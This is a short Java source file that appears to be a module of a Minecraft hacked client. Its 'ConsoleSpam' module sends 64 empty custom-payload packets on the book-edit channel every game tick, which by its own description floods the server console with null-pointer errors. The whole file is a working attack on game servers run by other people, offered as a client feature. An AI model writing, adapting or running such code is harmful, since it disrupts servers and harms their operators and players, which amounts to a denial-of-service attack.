package org.emotionalpatrick.colossus.modules;

import org.emotionalpatrick.colossus.main.Helper;

import net.minecraft.src.Packet;
import net.minecraft.src.Packet250CustomPayload;

public class ConsoleSpam extends Module {

	int i = 0;

	public ConsoleSpam() {
		super("Console Spam", ".cs", "Spams console with null pointers", "Emotional Patrick");
	}
	
	@Override
	public void onTick() {
		this.i += 1;
		Packet250CustomPayload cp = new Packet250CustomPayload();
		cp.channel = "MC|BEdit";
		this.sendMultiplePackets(cp, 64);
	}

	public void sendMultiplePackets(Packet packet, int param) {
		for (int i = 0; i < param; i++)
			Helper.sendPacket(packet);
	}
}
